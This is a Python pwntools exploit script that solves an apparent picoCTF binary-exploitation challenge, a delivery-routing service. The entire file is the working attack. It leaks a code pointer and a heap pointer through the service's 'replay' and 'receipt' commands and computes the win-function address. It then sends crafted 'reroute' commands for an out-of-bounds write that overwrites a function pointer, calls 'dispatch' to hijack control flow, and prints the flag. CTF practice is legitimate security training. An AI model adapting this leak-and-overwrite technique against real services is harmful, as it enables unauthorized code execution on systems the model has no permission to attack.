from pwn import *

host = 'mysterious-sea.picoctf.net'
port = 61904

r = remote(host, port)

# runtime constants

invite = b'> '
map_name = 'city1'

order_begin_idx = 0
order_changed_idx = 17

x_coordinate = 1
y_coordinate = 1

win_partial_overwrite = 0x460

code_base_from_win = 0x2460
ord_from_code_base = 0x5080
map_nodes_from_heap = 24

map_nodes_offset = 131

# necessary functions

def get_invite():
	r.recvuntil(invite)

def load_map(map_name):
	get_invite()
	r.sendline(b'load ' + map_name.encode())

def add_order(x, y):
	get_invite()
	r.sendline(b'add_order ' + str(x).encode() + b' ' + str(y).encode())

def reroute(idx, x, y):
	get_invite()
	r.sendline(b'reroute ' + str(idx).encode() + b' ' + str(x).encode() + b' ' + str(y).encode())

def receipt(idx):
	get_invite()
	r.sendline(b'receipt ' + str(idx).encode())
	r.recvuntil(b'receipt: ')
	return r.recvline().decode()

def replay(idx):
	get_invite()
	r.sendline(b'replay ' + str(idx).encode())
	r.recvuntil(b'replay: ')
	return r.recvline().decode()

def dispatch(idx):
	get_invite()
	r.sendline(b'dispatch ' + str(idx).encode())

def get_addr_leak(source, base, offset):
	base_insertion = source.find(base)

	if (base_insertion < 0):
		return 0

	string_address = source[base_insertion + offset:-1]
	return int(string_address, 16)

def get_separated_and_formatted_win_addr(addr, sub):
	high32 = addr >> 32
	low32 = (addr & 0xffffffff) - sub

	return (high32, low32)

def get_flag():
	r.recvuntil(b'*** 30 minutes or FLAG free! ***')
	r.recv(6)
	flag = r.recvline().decode().strip()
	return flag

# exploitation

load_map(map_name)

add_order(x_coordinate, y_coordinate)

replay_string = replay(order_begin_idx)
code_leak = get_addr_leak(replay_string, 'renderer=', 9) 

if (not code_leak):
	print('[-] Insertion could not found')
	exit(1)

win_addr = (code_leak & ~0xfff) | win_partial_overwrite
code_base = win_addr - code_base_from_win
ord_struct = code_base + ord_from_code_base

print(f'[+] Win address : {hex(win_addr)}')
print(f'[+] ORD struct address : {hex(ord_struct)}')

receipt_string = receipt(order_begin_idx)
heap_leak = get_addr_leak(receipt_string, 'hint=', 5)

if (not heap_leak):
	print('[-] Insertion could not found')
	exit(1)

map_nodes = heap_leak + 24
print(f'[+] Map nodes : {hex(map_nodes)}')

heap_bss_spread = map_nodes - ord_struct

print(f'[i] Spread between MAP_NODES and ORD : {heap_bss_spread}')

(new_cost, calculated) = get_separated_and_formatted_win_addr(win_addr, 0x10)

print(f'Formatted win addr : {hex(new_cost)} <- high 32 | {hex(calculated)} <- low 32')

reroute(order_begin_idx, -1 * (heap_bss_spread // 8), calculated)

# after this index of this order will be changed to concatenated y_coord and x_coord

reroute(order_changed_idx, map_nodes_offset, new_cost)

# triggering of attack

dispatch(order_changed_idx)

flag = get_flag()

print(f'[+] Flag : {flag}')
